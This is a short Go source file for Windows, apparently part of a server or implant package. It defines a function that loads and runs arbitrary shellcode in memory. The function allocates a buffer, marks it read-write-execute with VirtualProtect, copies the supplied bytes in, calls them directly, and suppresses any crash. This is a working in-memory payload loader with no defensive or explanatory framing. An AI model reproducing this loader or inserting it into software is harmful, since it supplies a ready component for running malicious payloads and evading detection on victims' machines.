//go:build windows
// +build windows

package server

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32       = syscall.MustLoadDLL("kernel32.dll")
	VirtualProtect = kernel32.MustFindProc("VirtualProtect")
	old32          = syscall.MustLoadDLL("ole32.dll")
	CoTaskMemAlloc = old32.MustFindProc("CoTaskMemAlloc")
)

func shellcodeRun(code []byte) error {
	defer func() {
		if err := recover(); err != nil {
			fmt.Println(err)
		}
	}()
	l := uintptr(len(code))
	pwstrLocal, _, _ := CoTaskMemAlloc.Call(l)

	var old int
	_, _, _ = VirtualProtect.Call(pwstrLocal, l, 0x40, uintptr(unsafe.Pointer(&old)))
	h := [3]uintptr{pwstrLocal, l, l}
	s := *(*[]byte)(unsafe.Pointer(&h))

	copy(s, code)

	syscall.Syscall(pwstrLocal, 0, 0, 0, 0)
	return nil
}
